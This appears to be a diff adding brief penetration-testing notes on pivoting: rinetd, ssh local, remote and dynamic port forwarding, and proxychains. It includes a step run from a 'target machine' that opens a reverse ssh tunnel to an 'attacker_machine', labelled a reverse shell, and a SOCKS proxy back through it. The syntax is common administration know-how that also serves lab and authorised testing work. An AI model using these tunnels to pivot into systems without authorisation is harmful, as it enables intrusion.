@@ -1,0 +1,29 @@
+rinetd - port forwarding tool
+/etc/rinetd.conf
+
+ssh Tunneling: - 
+
+Local port Forwarding
+
+ssh <port to be forwarded machine> -p <port to recieve and send traffic> -L <listening port on our machine>:<destination Ip>:<destination port>
+
+Remote Port Forwarding:-
+
+ssh <attacker ip> -R <attackers port>:<victim's IP>:<port to forward>
+
+Dynamic Port Forwarding:-
+
+ssh -D <local ip and port> -p <remote port> <target>
+
+Proxy chains: - 
+
+from target machine:  
+reverse shell
+
+ssh -f -N -R 2222:localhost:22 attacker_machine 
+
+from attacker's machine: 
+
+ssh -f -N -D localhost:8080 -p  2222 target
+
+set proxychains to use port 8080
